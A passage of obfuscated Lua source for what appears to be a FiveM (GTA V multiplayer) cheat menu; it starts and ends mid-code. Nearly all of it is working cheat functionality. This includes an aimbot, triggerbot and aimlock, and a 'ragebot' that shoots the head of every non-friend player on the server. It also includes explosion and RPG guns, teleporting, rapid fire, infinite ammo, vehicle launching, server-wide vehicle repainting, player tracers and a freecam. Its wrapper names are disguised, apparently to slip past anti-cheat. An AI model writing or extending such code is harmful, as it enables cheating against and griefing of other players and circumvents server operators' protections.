                       local TargetCoords = Fatasf.n.GetPedBoneCoords(k, 31086, 0, 0, 0)
                       local IsPedAlive = Fatasf.n.IsEntityDead(k)
                       local playerInVeh = Fatasf.n.IsPedInAnyVehicle(Fatasf.n.PlayerPedId(), 0)
                       if playerInVeh then
                       if not IsPedAlive and not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then
                       Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.0, false,Fatasf.n.GetHashKey('WEAPON_PISTOL'),Fatasf.n.PlayerPedId(), true, true, 1000.0)
                       CockT.Inv["Wait"](10)
                       else
                       end
                   else
                   end
                   end
               end
   
               if CockMeni.Functions.Triggerbot then
                   local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                   if hasTarget and Fatasf.n.IsPedAPlayer(target) then
                       local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetPedBoneCoords(target, 0, 0.0, -0.2, 0.0))
                       Fatasf.n.SetPedShootsAtCoord(Fatasf.n.PlayerPedId(), x, y, z, true)
                   end
               end
                   if CockMeni.Functions.Aimbot then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           local red = 255
                           local green = 255
                           local blue = 255
           
                           if not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then 
                               local coords = Fatasf.n.GetEntityCoords(pPed, false)
                               local mycoords = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId(), false)
                               local distace = Fatasf.n.GetDistanceBetweenCoords(mycoords.x, mycoords.y, mycoords.z, coords.x, coords.y, coords.z, false)
                               local Rotation = Fatasf.n.GetEntityRotation(pPed)
                               local Direct = CockMeni.Functions.RotationToDirection(Rotation)
                               local fovx = CockMenu.ComboBoxesT.Fov[CockMenu.ComboBoxesT.FovMultIndex]
                               local ecnatsid = 200
                               local _, x_world, y_world = Fatasf.n.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
                               local x_screen, y_screen = Fatasf.n.GetActiveScreenResolution()
                               local Radius = Functions.f.TranslateFOVInNumber(fovx)
                               local IsInCFOV = Functions.f.IsInCFOVCircleFOV(x_screen / 2, y_screen / 2, Radius, x_world * x_screen, y_world * y_screen)
                               if distace < ecnatsid then
                                   if Fatasf.n.IsDisabledControlPressed(0, CockT.Keys["LEFTALT"]) then
                                       local TargetCoords = Fatasf.n.GetPedBoneCoords(pPed, CockMenu.ComboBoxesT.Bone[CockMenu.ComboBoxesT.HeadMultIndex], 0, 0, 0)
                                       local IsPedAlive = Fatasf.n.IsEntityDead(pPed)
                                       if not IsPedAlive then
                                           if VisibleCheck then
                                               if Fatasf.n.HasEntityClearLosToEntity(Fatasf.n.PlayerPedId(), pPed, 17) then
                                                   if IsInCFOV then 
                                                       if CockMeni.Functions.targets then
                                                           Fatasf.n.DrawLine(mycoords.x, mycoords.y, mycoords.z, coords.x, coords.y, coords.z, red, green, blue, 255)
                                                           CockT.Global.DrawTextOnCoords(coords.x, coords.y, coords.z, 'Targeting', red, green, blue, 0, 0.20)
                                                           if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                               Fatasf.n.SetPedShootsAtCoord(Fatasf.n.PlayerPedId(), (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), true)
                                                               --Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                           CockT.Inv["Wait"](10)
                                                       end
                                                       else
                                                           if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                               Fatasf.n.SetPedShootsAtCoord(Fatasf.n.PlayerPedId(), (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), true)
                                                               --Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                               CockT.Inv["Wait"](10)
                                                       end
                                                       end 
                                                   end
                                               end
                                           else
                                               if IsInCFOV then
                                                   if CockMeni.Functions.targets then
                                                       Fatasf.n.DrawLine(mycoords.x, mycoords.y, mycoords.z, coords.x, coords.y, coords.z, red, green, blue, 255)
                                                       CockT.Global.DrawTextOnCoords(coords.x, coords.y, coords.z, 'Targeting', red, green, blue, 0, 0.20)
                                                       if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                       Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                       CockT.Inv["Wait"](10)
                                                   end
                                                   else
                                                       if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                       Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z,0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                       CockT.Inv["Wait"](10)
                                                   end
                                                   end
                                               end
                                           end
                                       end
                                   end
                               end
                           end
                       end
                   end	
       
               
       
               if CockMeni.Functions.ragebot then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       local Rotation = Fatasf.n.GetEntityRotation(pPed)
                       local Direct = CockMeni.Functions.RotationToDirection(Rotation)
                       local TargetCoords = Fatasf.n.GetPedBoneCoords(pPed, CockMenu.ComboBoxesT.Bone[CockMenu.ComboBoxesT.HeadMultIndex], 0, 0, 0)
                       local IsPedAlive = Fatasf.n.IsEntityDead(pPed)
                       if not IsPedAlive and not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then
                           Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1150.0, false,Fatasf.n.GetHashKey('WEAPON_PISTOL'),Fatasf.n.PlayerPedId(), true, true, 1000.0)
                           CockT.Inv["Wait"](0)
                       end
                   end
               else
               end
       
               if Cock.Menu.molotovgun then
                   local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) 
                   if ret then 
                       Fatasf.n.AddExplosion(position.x, position.y, position.z, 3, 100.0, true, false, 100000.0) 
                   end
               end
               if Cock.Menu.Tpgun then
                   local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) 
                   if ret then 
                       Fatasf.n.SetEntityCoordsNoOffset(Fatasf.n.PlayerPedId(), position.x, position.y, position.z+1.0, true, true, true)
                       CockT.Inv["Wait"](0)
                   end
               end
               if Cock.Menu.RPGGun then
                   local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) 
                   if ret then 
                       Fatasf.n.ShootSingleBulletBetweenCoords( position.x, position.y, position.z, position.x, position.y, position.z, 50.0, false, Fatasf.n.GetHashKey('WEAPON_RPG'), Fatasf.n.PlayerPedId(), true, true, 1.0)
                   end
               end
               if Cock.Menu.rapidfire then
                   CockT.Inv["Invoke"](CockT.Natives['DisablePlayerFiring'], Fatasf.n.PlayerPedId(), true)
                   if Fatasf.n.IsDisabledControlPressed(0, 257) and Fatasf.n.IsPlayerFreeAiming(Fatasf.n.PlayerId()) then
                       local _, weapon = Fatasf.n.GetCurrentPedWeapon(Fatasf.n.PlayerPedId())
                       local wepent = Fatasf.n.GetCurrentPedWeaponEntityIndex(Fatasf.n.PlayerPedId())
                       local launchPos = Fatasf.n.GetEntityCoords(wepent)
                       local targetPos = Fatasf.n.GetGameplayCamCoord() + (CockMeni.Functions.RotationToDirection(Fatasf.n.GetGameplayCamRot(2)) * 200.0)
                   
                       Fatasf.n.ShootSingleBulletBetweenCoords( launchPos, targetPos, 5, 1, weapon, Fatasf.n.PlayerPedId(), true, true, 24000.0)
                       Fatasf.n.ShootSingleBulletBetweenCoords( launchPos, targetPos, 5, 1, weapon, Fatasf.n.PlayerPedId(), true, true, 24000.0)
                   end
               end
   
               if Cock.Menu.infammo then
                   CockT.Inv["Invoke"](CockT.Natives['SetPedInfiniteAmmoClip'], Fatasf.n.PlayerPedId(), true)
               else
                   CockT.Inv["Invoke"](CockT.Natives['SetPedInfiniteAmmoClip'], Fatasf.n.PlayerPedId(), false)
               end
   
               if Cock.Menu.shootvehs then
                   local player = Fatasf.n.PlayerPedId()
                   local _, position = Fatasf.n.GetPedLastWeaponImpactCoord(player) 
                   local vehicles = {"adder", "banshee", "bus", "freecrawler", "akuma", "banshee",}
                   if _ then
                       local randomvehs = vehicles[CockT.Math.random(#vehicles)]
                       
                       if not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey(randomvehs)) then
                           Fatasf.n.RequestModel(Fatasf.n.GetHashKey(randomvehs))
                       end	
                       local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey(randomvehs), position.x, position.y, position.z , 1, true, true)
                       local rotation = Fatasf.n.GetEntityRotation(player)
                       Fatasf.n.SetVehicleEngineOn(veh, true, true, true)
                       Fatasf.n.SetEntityRotation(veh, rotation, 0.0, 0.0, 0.0, true)
                       Fatasf.n.SetVehicleForwardSpeed(veh, 500.0)
                   end
               end
   
               if Cock.Menu.particlegun then
                   local currentparticle = CockMeni.Functions.ParticleModes[CockMeni.Functions.CurrentParticle]	
                   
                   Functions.f.DrawTextTest(currentparticle, false, 0.35, 0, 0.5, 0.957)
       
                   if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["RIGHT"]) then
                       CockMeni.Functions.CurrentParticle = CockMeni.Functions.CurrentParticle + 1
                       if CockMeni.Functions.CurrentParticle > #CockMeni.Functions.ParticleModes then
                           CockMeni.Functions.CurrentParticle = 1
                       end
                   end
                   if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["LEFT"]) then
                       CockMeni.Functions.CurrentParticle = CockMeni.Functions.CurrentParticle - 1
                       if CockMeni.Functions.CurrentParticle < 1 then
                           CockMeni.Functions.CurrentParticle = #CockMeni.Functions.ParticleModes
                       end
                   end
                   
       
                       if currentparticle == 'Blood' then
                           if Fatasf.n.IsPedArmed(_cit_.InvokeNative(0xD80958FC74E988A6), 7) and Fatasf.n.IsPedArmed(_cit_.InvokeNative(0xD80958FC74E988A6), 6) then
                               CockT.Inv["Thread"](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(_cit_.InvokeNative(0xD80958FC74E988A6)) if Z then
                                   local ef = {
                                       {"core", "blood_stab"},
                                       {"core", "td_blood_shotgun"}
                                   }
                                   for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end) end 
                       end
                       if currentparticle == 'Smoke' then
                           if Fatasf.n.IsPedArmed(_cit_.InvokeNative(0xD80958FC74E988A6), 7) and Fatasf.n.IsPedArmed(_cit_.InvokeNative(0xD80958FC74E988A6), 6) then
                               CockT.Inv["Thread"](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(_cit_.InvokeNative(0xD80958FC74E988A6)) if Z then
                                   local ef = {
                                       {"scr_tplaces", "scr_tplaces_team_swap_nocash"},
                                   }
                                   for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end) end 
                       end
                       if currentparticle == 'Fireworks' then
                           if Fatasf.n.IsPedArmed(_cit_.InvokeNative(0xD80958FC74E988A6), 7) and Fatasf.n.IsPedArmed(_cit_.InvokeNative(0xD80958FC74E988A6), 6) then
                               CockT.Inv["Thread"](function()
                                       local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(_cit_.InvokeNative(0xD80958FC74E988A6))
                                       if Z then
                                           local ef = {
                                               {"proj_indep_firework", "scr_indep_launcher_sparkle_spawn"},
                                               {"proj_indep_firework_v2", "scr_xmas_firework_burst_fizzle"},
                                               {"proj_indep_firework_v2", "scr_firework_indep_burst_rwb"},
                                               {"proj_xmas_firework", "scr_firework_xmas_ring_burst_rgw"}
                                           }
                                           for eg, eh in CockT.Math.pairs(ef) do
                                               if eh then
                                                   if eh[1] and eh[2] then
                                                       while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do
                                                           CockT.Inv["Wait"](0)
                                                           Fatasf.n.RequestNamedPtfxAsset(eh[1])
                                                       end
                                                       Fatasf.n.UseParticleFxAsset( eh[1])
                                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false)
                                           end end end end end) end 
                                   end
                       if currentparticle == 'Cartoon' then
                           CockT.Inv["Thread"](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(_cit_.InvokeNative(0xD80958FC74E988A6)) if Z then
                               local ef = {
                                   {"scr_rcbarry2", "muz_clown"},
                               }
                               for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end)
                       end
                       if currentparticle == 'Explode' then
                           CockT.Inv["Thread"](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(_cit_.InvokeNative(0xD80958FC74E988A6)) if Z then
                               local ef = {
                                   {"scr_trevor3", "scr_trev3_c4_explosion"},
                                   {"cut_finale1", "cs_finale1_car_explosion"}
                               }
                               for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end)
                       end
               end
       
               if Cock.Menu.cvcolour then
                   local vehicle = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
                   CockMeni.Functions.RGBPicker(CockT.RGBPicker['MyCar'])
                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomPrimaryColour'], vehicle, CockT.RGBPicker['MyCar'].red, CockT.RGBPicker['MyCar'].green, CockT.RGBPicker['MyCar'].blue)
                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomSecondaryColour'], vehicle, CockT.RGBPicker['MyCar'].red, CockT.RGBPicker['MyCar'].green, CockT.RGBPicker['MyCar'].blue)
               end
       
               if Cock.Menu.paintallvehs then
                   CockMeni.Functions.RGBPicker(CockT.RGBPicker['AllVehicles'])
                   for vehs in Fatasf.n.EnumerateVehicles() do
                       --Fatasf.n.RequestControlOnce(vehs)
                       CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomPrimaryColour'], vehs, CockT.RGBPicker['AllVehicles'].red, CockT.RGBPicker['AllVehicles'].green, CockT.RGBPicker['AllVehicles'].blue)
                       CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomSecondaryColour'], vehs, CockT.RGBPicker['AllVehicles'].red, CockT.RGBPicker['AllVehicles'].green, CockT.RGBPicker['AllVehicles'].blue)
                   end
               end
               
               if CockMeni.Functions.hitsound then
                   local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                   if hasTarget and Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) and Fatasf.n.IsEntityAPed(target) and not Fatasf.n.IsEntityDead(target) then
                       --local hitsound = Fatasf.n.CreateAnDui("https://cock.menu/music/hitsound.mp3", 50, 50)
                       --Fatasf.n.DestroyDui(hitsound)
                       Fatasf.n.PlaySoundFrontend(-1, "PROPERTY_PURCHASE", "HUD_AWARDS", true)
                   end
               end
   
               if CockMeni.Functions.hitmarker then
                   local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                   if hasTarget and Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) and Fatasf.n.IsEntityAPed(target)  then
                       Fatasf.n.RequestStreamedTextureDict('helicopterhud', true)
                       for asdi = 0, 25 do
                           CockT.Inv["Wait"](0)
                           Fatasf.n.DrawSprite('helicopterhud', 'hud_lock',  0.5, 0.5, 0.023, 0.04, 45.0, 255, 255, 255, 255)
                       end
                   end
               end
       
               if Cock.Menu.customhud then
                   CockMeni.Functions.RGBPicker(CockT.RGBPicker['CustomHud'])
                   CockT.Inv["Invoke"](CockT.Natives['ReplaceHudColourWithRgba'], 116, CockT.RGBPicker['CustomHud'].red, CockT.RGBPicker['CustomHud'].green, CockT.RGBPicker['CustomHud'].blue, 255)
               end
       
               if Cock.Menu.tracers then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       local _self = Fatasf.n.PlayerPedId()
                       local xx, yy, zz = CockT.Strings.tunpack(Functions.f.GetPedBoneCoords(pPed, 0, 0.0, 0.0, 0.0))
                       local x, y, z = CockT.Strings.tunpack(Functions.f.GetPedBoneCoords(_self, bone, 0.0, 0.0, 0.0))
                       if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(pPed), Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] then
                           Fatasf.n.DrawLine(xx, yy, zz, x, y, z, 255, 255, 255, 255)
                       end
                   end
               end
       
               if Cock.Menu.xenonl then
                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleExtra'], veh, 2, 0)
               else
                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleExtra'], veh, 2, 1)
               end
       
   
   
               if CockMeni.Functions.udwallslock then
                   local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                   if hasTarget and Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) and Fatasf.n.IsEntityAPed(target) and not Fatasf.n.IsEntityDead(target) then
                       local coords = Fatasf.n.GetPedBoneCoords(target, CockMenu.ComboBoxesT.Bone[CockMenu.ComboBoxesT.HeadMultIndex], 0.0, 0.0, 0.0)
                       Fatasf.n.ShootSingleBulletBetweenCoords(coords.x, coords.y - 0.2, coords.z, coords.x, coords.y, coords.z, 0.1, true, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()), Fatasf.n.PlayerPedId(), true, true, 1.0)
                   end
               end
   
               if CockMeni.Functions.Aimlock then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                           
                       if CockT.Inv["Invoke"](CockT.Natives['IsAimCamActive']) and Fatasf.n.IsEntityOnScreen(pPed) and Fatasf.n.HasEntityClearLosToEntity(pPed, Fatasf.n.PlayerPedId(), 17) then
                           local coords = Fatasf.n.GetPedBoneCoords(pPed, CockMenu.ComboBoxesT.Bone[CockMenu.ComboBoxesT.HeadMultIndex], 0.0, 0.0, 0.0) --Fatasf.n.GetEntityCoords(k, false)
                           local _, x_world, y_world = Fatasf.n.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
                           local x_screen, y_screen = Fatasf.n.GetActiveScreenResolution() 
                           local fovxy = CockMenu.ComboBoxesT.Fov[CockMenu.ComboBoxesT.FovMultIndex]
                           local Radius = Functions.f.TranslateFOVInNumber(fovxy)
                           local IsInCFOV = Functions.f.IsInCFOVCircleFOV(x_screen / 2, y_screen / 2, Radius, x_world * x_screen, y_world * y_screen)
       
                           if not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then
                               if IsInCFOV and Fatasf.n.GetEntityHealth(pPed) > 1 then
                                   if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                   else
                                       local TRot = CockMeni.Functions.GetRotation(coords - Fatasf.n.GetGameplayCamCoord())
                                       local PRot = CockMeni.Functions.PedRotation(Fatasf.n.PlayerPedId(), 2)
                                       local _x = TRot.z - PRot.z
                                       local _y = TRot.x 
                                       local nx = Functions.f.Lerp(0.124, 0.001, TRot.z - PRot.z)
                                       Fatasf.n.SetGameplayCamRelativeRotation(nx, TRot.x, 1.0)
                                       if CockMeni.Functions.targets then
                                           local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                           Fatasf.n.SetDrawOrigin(coords.x, coords.y, coords.z, 0)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", -0.01 / dist * 4, -0.015 / dist * 4, 0.013, 0.013, 0.0, 255, 0, 0, 200)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", 0.01 / dist * 4, -0.015 / dist * 4, 0.013, 0.013, 90.0, 255, 0, 0, 200)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", -0.01 / dist * 4, 0.015 / dist * 4, 0.013, 0.013, 270.0, 255, 0, 0, 200)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", 0.01 / dist * 4, 0.015 / dist * 4, 0.013, 0.013, 180.0, 255, 0, 0, 200)
                                           Fatasf.n.ClearDrawOrigin()
                                           Fatasf.n.DrawLine(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId(), false), Fatasf.n.GetEntityCoords(pPed, false), red, green, blue, 255)
                                       end
                                   end
                               else
           
                               end
                               end
                           end
                       end
                   end
                   
       
           end
       end)
   
       CockT.Inv["Thread"](function()
           while CockMenu.MenuEnabled do
               CockT.Inv["Wait"](0)
               if Cock.Menu.Freecam then
                   if not shown then
                       local fakeobj = 0
                       local freecam_cam_rot = Fatasf.n.GetCamRot(freecam_cam, 2)
                       freecam_cam = freecam_cam
                       if not freecam_cam ~= nil then
                           freecam_cam = Fatasf.n.CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                       end
                       if not cam ~= nil then
                           cam = Fatasf.n.CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                           freecamcam = cam
                       end
               
                       Fatasf.n.RenderScriptCams(1, 0, 0, 1, 1)
                       Fatasf.n.SetCamActive(cam, true)
                       
                       local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                       local xx = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerX))
                       local yy = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerY))
                       local zz = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerZ))
                       
                       Fatasf.n.SetCamCoord(cam, xx, yy-1.0, zz+0.5)
                       local offsetRotX = 0.0
                       local offsetRotY = 0.0
                       local offsetRotZ = 0.0
                       local weapondelay = 0
               
                       while Fatasf.n.DoesCamExist(freecamcam) do
                           CockT.Inv["Wait"](0)
                           
               
                           if not Cock.Menu.Freecam then
                               Fatasf.n.DestroyCam(freecamcam)
                               Fatasf.n.ClearTimecycleModifier()
                               Fatasf.n.RenderScriptCams(false, false, 0, 1, 0)
                               Fatasf.n.SetFocusEntity(Fatasf.n.PlayerPedId())
                               Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), false)
                               break
                           end
                           
                           if not shown then
                               
                               local playerPed = Fatasf.n.PlayerPedId()
                               local playerRot = Fatasf.n.GetEntityRotation(playerPed, 2)
                               
                               local rotX = playerRot.x
                               local rotY = playerRot.y
                               local rotZ = playerRot.z
                               offsetRotX = offsetRotX - (Fatasf.n.GetDisabledControlNormal(1, 2) * 8.0)
                               offsetRotZ = offsetRotZ - (Fatasf.n.GetDisabledControlNormal(1, 1) * 8.0)
                               if (offsetRotX > 90.0) then
                                   offsetRotX = 90.0
                               elseif (offsetRotX < -90.0) then
                                   offsetRotX = -90.0
                               end
                               if (offsetRotY > 90.0) then
                                   offsetRotY = 90.0
                               elseif (offsetRotY < -90.0) then
                                   offsetRotY = -90.0
                               end
                               if (offsetRotZ > 360.0) then
                                   offsetRotZ = offsetRotZ - 360.0
                               elseif (offsetRotZ < -360.0) then
                                   offsetRotZ = offsetRotZ + 360.0 
                               end
                               local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetCamCoord(cam))
                               local camCoords       = Fatasf.n.GetCamCoord(cam)			
                               local v3, forward  = CockMeni.Functions.CamRightVect(cam), CockMeni.Functions.CamFwdVect(cam)
                               local speedMultiplier = nil	
                               local currentmode = CockT.Global.FreecamModes[CockT.Global.FreecamMode]
                               
               
                               Fatasf.n.SetTextOutline(); Functions.f.DrawTextTest('.', false, 0.4, 0, 0.5, 0.482)
                               
                               
               
                               CockT.Inv["Invoke"](CockT.Natives['SetHdArea'], camCoords.x, camCoords.y, camCoords.z, 50.0)			
                               
                               Fatasf.n.DisableControlAction(0, 32, true) Fatasf.n.DisableControlAction(0, 31, true) Fatasf.n.DisableControlAction(0, 30, true) Fatasf.n.DisableControlAction(0, 34, true) Fatasf.n.DisableControlAction(0, 22, true) Fatasf.n.DisableControlAction(0, 34, true)  Fatasf.n.DisableControlAction(0, 69, true) Fatasf.n.DisableControlAction(0, 70, true) Fatasf.n.DisableControlAction(0, 92, true) Fatasf.n.DisableControlAction(0, 114, true) Fatasf.n.DisableControlAction(0, 257, true) Fatasf.n.DisableControlAction(0, 263, true) Fatasf.n.DisableControlAction(0, 264, true) Fatasf.n.DisableControlAction(0, 331, true) Fatasf.n.DisableControlAction(0, 24, true) Fatasf.n.DisableControlAction(0, 25, true)
                               Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), true)
                               --CockT.Inv["Invoke"](CockT.Natives['DisableAllControlActions'], 0)
                               --CockT.Inv["Invoke"](CockT.Natives['DisableAllControlActions'], 1)
                               if Fatasf.n.IsDisabledControlPressed(0, 21) then					
                                   speedMultiplier = 3.0				
                               elseif Fatasf.n.IsDisabledControlPressed(0, 36) then					
                                   speedMultiplier = 0.025				
                               else					
                                   speedMultiplier = 0.25				
                               end					
                               if Fatasf.n.IsDisabledControlPressed(0, 32)  then					
                                   local newCamPos = camCoords + forward * speedMultiplier					
                                   Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                               end							
                               if Fatasf.n.IsDisabledControlPressed(0, 33)  then					
                                   local newCamPos = camCoords + forward * -speedMultiplier					
                                   Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                               end							
                               if Fatasf.n.IsDisabledControlPressed(0, 34)  then
                                   local newCamPos = camCoords + v3 * -speedMultiplier					
                                   Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                               end							
                               if Fatasf.n.IsDisabledControlPressed(0, 30)  then					
                                   local newCamPos = camCoords + v3 * speedMultiplier					
                                   Fatasf.n.SetCamCoord(cam, newCamPos.x, newCamPos.y, newCamPos.z)				
                               end		
               
                               if (Fatasf.n.IsDisabledControlPressed(1, 21)) then -- SHIFT
                                   z = z + (0.1 * 2.5)
                               end
                               if (Fatasf.n.IsDisabledControlPressed(1, 36)) then -- LEFT CTRL
                                   z = z - (0.1 * 0.5)
                               end
                               CockT.Inv["Invoke"](CockT.Natives['SetFocusArea'], Fatasf.n.GetCamCoord(cam).x, Fatasf.n.GetCamCoord(cam).y, Fatasf.n.GetCamCoord(cam).z, 0.0, 0.0, 0.0)
                               Fatasf.n.SetCamRot(cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                               local entity = CockT.Global.GetEntityInFrontOfCam()
                               if entity ~= 0 and Fatasf.n.DoesEntityExist(entity) and GetEntityType(entity) ~= 0 or nil then
                                   CockT.Global.DrawLineBox(entity, 8, 214, 101, 255)
                               end
                                   
               
